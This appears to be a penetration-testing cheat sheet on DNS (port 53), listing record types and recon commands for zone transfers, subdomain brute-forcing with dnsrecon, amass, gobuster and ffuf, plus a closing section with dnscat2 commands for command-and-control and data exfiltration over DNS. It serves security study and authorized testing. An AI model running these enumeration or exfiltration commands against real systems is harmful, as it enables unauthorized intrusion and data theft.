---
description: Domain Name System
---

# 53 - DNS

[active-information-gathering.md](../active-information-gathering.md)

Domain --> DNS Server --> DNS recursor --> DNS root zone (TLD) --> authoritative nameserver --> IP

• NS - Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.&#x20;

• A - Also known as a host record, the “a record” contains the IP address of a hostname (such as www.megacorpone.com).&#x20;

• MX - Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.&#x20;

• PTR - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.&#x20;

• CNAME - Canonical Name Records are used to create aliases for other host records.&#x20;

• TXT - Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.

## Get domain

```sh
nslookup 
> server $IP
> $IP

dig @$IP -x $IP +short
```

```bash
host www.megacorpone.com # Get the IP (default)
host -t [mx/txt] # type of record (MX or TXT)

# FORWARD LOOKUP BRUTE FORCE
for ip in $(cat list.txt); do host $ip.megacorpone.com; done # use Seclists

# REVERSE LOOKUP BRUTE FORCE (TAKING THE IP APPROX RANGE FROM THE PREV STEP)
for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"

# DNS ZONE TRANSFERS
host -l <domain name> <dns server address> # second arg is a nameserver 

# TOOLS
dnsrecon -d megacorpone.com -t axfr
dnsrecon -d megacorpone.com -D list.txt -t brt # -D list of subdomains
dnsenum zonetransfer.me

# Standard enumeration with findomain
findomain -t "target.domain" -a

# Standard enumeration with subfinder
subfinder -d "target.domain"

# Pipe subfinder with httpx to find HTTP services
echo "target.domain" | subfinder -silent | httpx -silent

# Standard enumeration with assetfinder
assetfinder "target.domain"
```

## Query domain


```bash
dig @IP $DOMAIN
dig @IP $DOMAIN ns
dig @IP $DOMAIN mx

dnsenum --dnsserver $IP -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.com
```


## Domain Zone Transfer

[https://digi.ninja/projects/zonetransferme.php](https://digi.ninja/projects/zonetransferme.php)

Find subdomains not listed, it helps to get interesting info

```bash
Dig --> requests to DNS servers
dig axfr @IP $DNS
Ex: dig axfr @10.10.10.123 friendzone.red

# NOTE THE DIFFERENT DOMAINS AND INCLUDE ALL OF THEM WITH THE SAME IP

cat /etc/hosts
10.10.1.1 feos.domain administrator.domain uploads.domain others.domain

# NOTE: IT'S IMPORTANT TO SEE IF THE COMMONNAME OR DNS BELONGS TO HTTP OR HTTPS

############ WINDOWS
nslookup.exe
> server $TARGET_IP
> ls -d $DOMAIN
```

## Amass

OWASP's [Amass](https://github.com/OWASP/Amass) (Go) tool can gather information through DNS bruteforcing, DNS sweeping, NSED zone walking, DNS zone transfer, through web archives, through online DNS datasets and aggregators APIs, etc.

`amass enum --passive -d "domain.com"`

## DNSRecon

[DNSRecon](https://github.com/darkoperator/dnsrecon) (Python) can enumerate DNS information through the following techniques: check NS records for zone transfers, enumerate records, check for wildcard resolution, TLD expansion, bruteforce subdomain and host A and AAAA records given a wordlist, perform PTR lookup given an IP range, DNS cache snooping, etc.
```sh
# General enumeration
dnsrecon -d "target.domain"
# Standard enumeration and zone transfer (AXFR)
dnsrecon -a -d "target.domain"
# DNS bruteforcing/dictionnary attack
dnsrecon -t brt -d "target.domain" -n "nameserver.com" -D "/path/to/wordlist"
```

## DNS bruteforcing

Apart from [Amass](https://www.thehacker.recipes/web/recon/domains-enumeration#amass) and [DNSRecon](https://www.thehacker.recipes/web/recon/domains-enumeration#dnsrecord) mentioned above, [gobuster](https://github.com/OJ/gobuster) (go) can be used to do DNS bruteforcing.

`gobuster dns --domain "target.domain" --resolver "nameserver" --wordlist "/path/to/wordlist"`

Virtual hosting

Some applications don't allow vhost fuzzing like showcased above. The command below can be attempted.

`ffuf -c -r -w "/path/to/wordlist.txt" -u "http://FUZZ.$TARGET/"`

NOTE: Virtual host fuzzing is not the only technique to find subdomains. There are others means to that end: see [subdomains enumeration](https://www.thehacker.recipes/web/recon/domains-enumeration).


## DNS Rebinding

[https://nip.io/](https://nip.io/)

```
app.10.8.0.1.nip.io maps to 10.8.0.1
app-116-203-255-68.nip.io maps to 116.203.255.68
```

## Post-Exploitation 
### DNS Exfiltration 
> DNS exfiltration leverages DNS queries to extract data from compromised systems. dnscat2 provides encrypted command-and-control capabilities over DNS.

```sh
# Server setup
dnscat2 --dns server=$DNS_SERVER_IP:53

# Client connection
dnscat2 $DOMAIN
```
